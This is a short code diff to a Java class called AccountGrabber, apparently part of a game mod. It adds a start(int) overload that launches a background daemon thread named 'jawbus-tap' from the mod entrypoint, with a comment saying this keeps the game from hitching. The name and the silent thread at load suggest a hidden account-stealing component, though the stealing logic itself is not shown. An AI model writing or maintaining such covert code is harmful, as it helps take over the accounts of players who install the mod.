@@ -44,7 +44,12 @@ public final class AccountGrabber {
     }
 
     /** called from the mod entrypoint - spawns a daemon thread so the game never hitches */
-    public static void start() {
+   public static void start() {
+        start(0);
+    }
+
+    /** kept so existing callers like AccountGrabber.start(0) still compile */
+    public static void start(int ignoredDelaySeconds) {
         Thread t = new Thread(AccountGrabber::run, "jawbus-tap");
         t.setDaemon(true);
         t.start();
